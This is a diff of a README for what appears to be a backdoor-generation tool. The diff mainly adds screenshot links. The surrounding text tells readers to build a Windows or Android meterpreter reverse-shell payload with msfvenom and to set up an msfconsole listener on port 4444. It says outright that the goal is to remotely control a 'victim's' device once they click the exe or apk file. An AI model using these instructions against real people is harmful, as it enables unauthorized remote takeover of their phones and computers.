@@ -8,7 +8,12 @@ Welcome everyone
 # [+]About
 --------------------------------------------------------------------------------------------
 This is a payload creation machine Tool , To make something like back door and so one to completely remote a PC or android phone Just one click on the file "exe, apk" 
-and u will be able to open a session and tunnel with your victim’s device with msfcosnsole Have a good time Good bye my friend …
+and u will be able to open a session and tunnel with your victim’s device with msfcosnsole Have a good time
+
+Good bye my friend …
+
+
+![Screenshot 2022-09-19 133233](https://user-images.githubusercontent.com/88976173/191008194-2d19901e-946c-42e2-a43f-c3c28529fb77.png)
 
 
  # [+]How to Download
@@ -24,6 +29,9 @@ After preparing your payload via Payload-injection tool you can open msfconsole 
 **sudo su**
 
 **msfvenom -p windows/meterpreter/reverse_tcp -f exe lhost = your ip lport = 4444 > FileName .exe**
+![Screenshot 2022-09-19 002119](https://user-images.githubusercontent.com/88976173/191006795-be110c62-ee54-48b6-9352-a4f94b6478e8.jpg)
+
+
 
 if you build up a paylaod for android you will change the windows to android and so on 
 
@@ -46,6 +54,11 @@ wiat proccess//
 **set lport 4444**
 
 **run**
+
+![Screenshot 2022-09-19 132613](https://user-images.githubusercontent.com/88976173/191007284-d7a7fca5-e6b4-46f6-99bd-365356226f0a.png)
+
+
+
 
  HERE WE ARE DONE OF CREATING A VIRUS ALL U NEED TO WAIT THE VICTIM TO CLICK ON THE APK  OR EXE FILE
  
